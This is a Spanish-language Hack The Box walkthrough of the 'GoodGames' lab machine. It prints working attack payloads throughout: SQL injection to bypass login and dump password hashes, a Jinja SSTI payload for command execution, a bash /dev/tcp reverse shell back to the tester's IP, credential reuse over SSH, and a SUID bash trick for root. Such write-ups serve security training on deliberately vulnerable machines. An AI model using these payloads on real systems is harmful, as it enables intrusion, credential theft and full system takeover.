---
title: GoodGames
parent: Easy
nav_order: 2
---

# Walkthrough — GoodGames (Hack The Box)
{: .fs-9 }

> Un recorrido completo y detallado de la máquina GoodGames de HTB, donde aprovechamos vulnerabilidades web para escalar hasta obtener acceso como root.
{: .fs-6 .fw-300 }

---

## 🔰 Introducción

**GoodGames** es una máquina de dificultad *fácil*, pero con una serie de pasos muy interesantes, que involucran inyecciones SQL, exposición de subdominios internos y explotación de plantillas en Flask.

- SO: Linux  
- Dificultad: Easy  
- Herramientas: `nmap`, `burpsuite`, `ffuf`, `netcat`, `python`

---

## 🔍 Escaneo de puertos con Nmap

El primer paso en casi cualquier evaluación de seguridad es descubrir qué servicios están expuestos al exterior. Utilizamos `nmap`, una herramienta fundamental en el reconocimiento de redes, para realizar un escaneo completo de puertos con detección de versiones y scripts por defecto:

```bash
nmap -sC -sV -p- -T4 10.10.11.130
```

- `-sC`: Usa los scripts por defecto de Nmap (como detectar versiones, scripts de seguridad, etc.)
- `-sV`: Detecta la versión del servicio en ejecución en cada puerto.
- `-p-`: Escanea todos los puertos (del 1 al 65535).
- `-T4`: Aumenta la velocidad del escaneo.

Este escaneo nos proporciona un mapa inicial del sistema de destino. Descubrimos que el puerto 80 (HTTP) está abierto y ejecutando un servidor Apache junto con Werkzeug (usado comúnmente con Flask).

Comenzamos descubriendo los puertos abiertos con `nmap`:

```bash
nmap -sC -sV -p- -T4 10.10.11.130
```

![Escaneo con Nmap](/assets/images/goodgames/01-nmap.png)

Nos revela el puerto `80` abierto, corriendo Apache con una aplicación web en Werkzeug/Python.

---

## 🌐 Acceso a la web principal

Visitamos el sitio web y nos encontramos con una interfaz de login. Sin embargo, el formulario impide usar direcciones de correo inválidas.

![Página de inicio con login](/assets/images/goodgames/02-login-form.png)

---

## 🧪 Modificando la petición con BurpSuite

Interceptamos la petición con Burp y modificamos el campo `email`, intentando una inyección SQL.

```sql
email='admin' or 1=1 -- -&password=gueco
```

![BurpSuite: SQL Injection en login](/assets/images/goodgames/03-sql-injection-burp.png)

---

## ✅ Login exitoso como administrador

¡La inyección SQL funciona! Nos autentica como el usuario `admin`.

![Login exitoso](/assets/images/goodgames/04-login-success.png)

---

## 🕵️‍♂️ Probando extracción con UNION

Probamos una consulta `UNION SELECT` básica:

```sql
email=' union select 1,2,3,4-- -&password=gueco
```

Esto nos muestra datos internos.

![Extracción básica de datos con UNION](/assets/images/goodgames/05-union-select-basico.png)

---

## 🧠 Extracción de usuarios con CONCAT

Ahora, usamos `CONCAT` para unir `id`, `name`, `email`, `password` y visualizarlo en la respuesta:

```sql
email=' union select 1,2,3,concat(id, ':', name, ':', email, ':', password) from user-- -&password=password
```

![Extrayendo usuarios y hashes](/assets/images/goodgames/06-union-concat-users.png)

---

## 🔓 Rompiendo el hash MD5

El hash MD5 recuperado es crackeado fácilmente online, revelando la contraseña: `superadministrator`.

![Hash crackeado](/assets/images/goodgames/07-md5-cracked.png)

---

## 🧭 Descubriendo un subdominio interno

En la parte superior del dashboard web, vemos un engranaje que enlaza a `internal-administration.goodgames.htb`.

Lo añadimos al archivo `/etc/hosts`.

![Editando /etc/hosts para subdominio interno](/assets/images/goodgames/08-etc-hosts.png)

---

## 🔐 Portal de login Flask Volt

El subdominio nos presenta un nuevo portal hecho en Flask.

![Login de administración en Flask](/assets/images/goodgames/09-flask-login.png)

---

## 🛠️ Interfaz de administración

Accedemos al dashboard administrativo tras autenticarnos como `admin`.

![Dashboard de administración](/assets/images/goodgames/10-admin-panel.png)

---

## 🔍 SSTI en plantilla de perfil

Detectamos una vulnerabilidad SSTI (Server Side Template Injection) al modificar el nombre en el perfil.

```jinja
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

![Ejecución de comandos con SSTI](/assets/images/goodgames/11-ssti-root-check.png)

---

## 🎯 Preparando una reverse shell

Enviamos una reverse shell a nuestra máquina desde la vulnerabilidad SSTI:

```jinja
{{ namespace.__init__.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/10.10.14.31/1234 0>&1'").read() }}
```

![Código de reverse shell SSTI](/assets/images/goodgames/12-ssti-reverse-shell.png)

---

## 📞 Capturando la shell con netcat

Escuchamos en nuestro equipo con `netcat`:

```bash
nc -lnvp 1234
```

![Escuchando con Netcat](/assets/images/goodgames/13-nc-listen.png)

---

## 🐚 Shell como root dentro del contenedor

¡Tenemos acceso root dentro del contenedor Docker!

![Shell obtenida como root](/assets/images/goodgames/14-docker-root-shell.png)

---

## 🧾 Leyendo la flag de usuario

Entramos en el directorio del usuario `augustus` y obtenemos `user.txt`.

![Obteniendo flag de usuario](/assets/images/goodgames/15-user-flag.png)

---

## 📡 Descubrimiento de red interna

Vemos que nuestra IP es `172.19.0.2`, lo cual sugiere una red interna. Intentamos conectar a `172.19.0.1`.

![IP dentro del contenedor](/assets/images/goodgames/16-ifconfig.png)

---

## 🔐 Conexión SSH al host

Utilizamos las credenciales descubiertas para conectarnos vía SSH al host principal desde el contenedor.

```bash
ssh augustus@172.19.0.1
```

![Conexión SSH exitosa](/assets/images/goodgames/17-ssh-augustus.png)

---

## 🚪 Escalada con bash SUID

Creamos un binario de `bash`, lo hacemos SUID y lo usamos para escalar privilegios:

```bash
cp /bin/bash .
chown root:root bash
chmod 4777 bash
```

![Configurando bash con SUID](/assets/images/goodgames/18-bash-suid.png)
![Configurando bash](/assets/images/goodgames/18b-bash-suid.png)

---

## 👑 Shell privilegiada y flag de root

Ejecutamos el bash con `-p` para obtener privilegios de root y leemos `root.txt`.

```bash
./bash -p
cat /root/root.txt
```

![Obteniendo flag de root](/assets/images/goodgames/19-root-flag.png)

---

## 🏁 Resumen final

| Etapa           | Resultado                                     |
|-----------------|-----------------------------------------------|
| Enumeración     | Portal web con login vulnerable               |
| Explotación     | SQLi para obtener hash y subdominio interno   |
| Escalada I      | SSTI → Shell en contenedor como root          |
| Escalada II     | SSH al host principal y bash SUID             |
| Flags           | `user.txt` y `root.txt`                       |

---

**Autor:** [gueco99](https://github.com/gueco99)  
🧠 Hack the Box – *GoodGames* (Easy)
